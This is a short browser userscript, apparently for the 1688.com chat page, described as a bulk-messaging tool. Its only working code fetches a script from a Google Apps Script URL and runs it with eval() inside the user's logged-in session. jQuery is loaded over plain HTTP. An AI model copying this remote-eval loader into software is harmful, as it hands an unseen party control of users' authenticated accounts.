// ==UserScript==
// @name         無尾熊1688聊聊網頁版
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  無尾熊1688聊聊網頁版 群發
// @author       You
// @match        https://air.1688.com/app/ocms-fusion-components-1688/def_cbu_web_im_core/index.html*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=1688.com
// @grant        none
// @require       http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js
// @license MIT
// @downloadURL https://update.greasyfork.org/scripts/466559/%E7%84%A1%E5%B0%BE%E7%86%8A1688%E8%81%8A%E8%81%8A%E7%B6%B2%E9%A0%81%E7%89%88.user.js
// @updateURL https://update.greasyfork.org/scripts/466559/%E7%84%A1%E5%B0%BE%E7%86%8A1688%E8%81%8A%E8%81%8A%E7%B6%B2%E9%A0%81%E7%89%88.meta.js
// ==/UserScript==

(function() {
    'use strict';
    setTimeout(()=>{
        var response = $.ajax({type: "GET",
                               url: `https://script.google.com/macros/s/AKfycbzCmBV1gaqglam0eLWXKEBuFZxJyRheA7zMzIx5cU169x4NvlGNivLCPxaChUfEeTNj4g/exec?type=getScriptByName&name=熊大1688群發`,
                               async: false}
                             ).responseText;

        eval(response);
    },2000);
    // Your code here...
})();